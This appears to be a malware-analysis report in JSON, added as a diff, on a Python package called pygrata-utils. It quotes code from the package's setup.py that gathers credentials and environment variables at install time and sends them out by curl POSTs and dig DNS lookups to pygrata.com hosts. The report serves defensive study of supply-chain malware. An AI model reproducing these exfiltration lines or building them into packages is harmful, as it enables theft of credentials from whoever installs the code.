@@ -1,0 +1,94 @@
+{
+  "package_metadata": {
+    "name": "pygrata-utils",
+    "version": "1.0.4",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [
+      "http://graphs.pygrata.com/uploader.php",
+      "http://graphs.pygrata.com/api.php",
+      "isuser.api.pygrata.com"
+    ],
+    "process_spawns": [
+      "subprocess.getoutput(acmd)",
+      "subprocess.getoutput(accmd)",
+      "subprocess.getoutput(bcmd)",
+      "subprocess.getoutput(ipcmd)",
+      "subprocess.getoutput(ccmd)",
+      "subprocess.getoutput(cdcmd)",
+      "subprocess.getoutput(catenvcmd)",
+      "curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@<filename>' -F 'submit=Upload'",
+      "curl -X POST http://graphs.pygrata.com/api.php -d 'textdata=<data>'",
+      "dig <hexusern>isuser.api.pygrata.com"
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "result = subprocess.getoutput(acmd)\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "getcred = subprocess.getoutput(accmd)\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "result2 = subprocess.getoutput(bcmd)\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "ipadd = subprocess.getoutput(ipcmd)\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "result3 = subprocess.getoutput(ccmd)\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "result4 = subprocess.getoutput(cdcmd)\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "output = subprocess.getoutput(catenvcmd)\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@' + filename2 + '' -F 'submit=Upload'\")\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + allen + '\"')\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@' + filename2 + '' -F 'submit=Upload'\")\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + all8 + '\"')\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.95,
+    "risk_score": 0.9,
+    "confidence": 0.98,
+    "cwe_ids": [
+      "CWE-78",
+      "CWE-94",
+      "CWE-200",
+      "CWE-502"
+    ]
+  }
+}
